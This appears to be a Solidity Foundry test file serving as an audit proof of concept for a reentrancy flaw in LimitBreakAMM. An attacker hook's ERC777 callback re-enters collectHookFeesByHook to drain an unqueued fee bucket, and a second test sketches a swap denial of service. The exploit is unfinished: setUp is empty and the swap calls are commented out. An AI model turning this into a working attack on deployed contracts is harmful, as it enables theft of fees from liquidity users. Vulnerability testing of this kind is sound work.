// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {LimitBreakAMM} from "lbamm-core/src/LimitBreakAMM.sol";
import {ModuleFeeCollection} from "lbamm-core/src/modules/ModuleFeeCollection.sol";

contract AttackerHook {
    ModuleFeeCollection public amm;
    address public tokenFor2;
    address public tokenFee2;
    bool private reentered;

    // ERC777 tokensReceived callback — fires when safeTransfer is called during fee collection loop
    function tokensReceived(
        address, address, address, uint256, bytes calldata, bytes calldata
    ) external {
        if (!reentered) {
            reentered = true;
            // SWAP_GUARD_FLAG is now 0 — direct path executes
            uint256 bucket2Balance = amm.getHookFeesOwedByHook(address(this), tokenFor2, tokenFee2);
            if (bucket2Balance > 0) {
                amm.collectHookFeesByHook(tokenFor2, tokenFee2, address(this), bucket2Balance);
            }
        }
    }
}

contract H10_CollectHookFeesBypassQueueViaflagClear is Test {
    LimitBreakAMM amm;
    AttackerHook hook;
    address tokenFee1; // ERC777 token
    address tokenFor1;
    address tokenFor2;
    address tokenFee2;

    function setUp() public {
        // Deploy AMM with AttackerHook registered as fee manager for two token pairs
        // Accumulate fees: bucket1 = (tokenFor1, tokenFee1=ERC777), bucket2 = (tokenFor2, tokenFee2)
        // Swap triggers queuing of bucket1 only
    }

    function test_directDrainOfBucket2_viaFlagClearWindow() public {
        uint256 bucket2Before = amm.getHookFeesOwedByHook(address(hook), tokenFor2, tokenFee2);
        assertTrue(bucket2Before > 0, "bucket2 should have balance");

        // Execute a swap that:
        // 1. Queues bucket1 fee collection (SWAP_GUARD_FLAG set)
        // 2. Swap ends, executeQueuedHookFeesByHookTransfers fires
        // 3. _setReentrancyFlags(NO_FLAGS) clears SWAP_GUARD_FLAG
        // 4. _transferHookFeesByHook for bucket1 → ERC777 tokensReceived fires in hook
        // 5. Hook calls collectHookFeesByHook(tokenFor2, tokenFee2, ...) → DIRECT path
        // 6. Bucket2 drained without having been queued

        // amm.singleSwap(...);

        uint256 bucket2After = amm.getHookFeesOwedByHook(address(hook), tokenFor2, tokenFee2);
        assertEq(bucket2After, 0, "bucket2 drained via flag-clear window despite not being queued");
    }

    function test_dosDuringQueueExecution_revertPropagates() public {
        // If hook requests amount > bucket2 balance → _transferHookFeesByHook reverts
        // Revert propagates through safeTransfer, reverting executeQueuedHookFeesByHookTransfers
        // Swap DoS confirmed
        vm.expectRevert();
        // amm.singleSwap(...);
    }
}

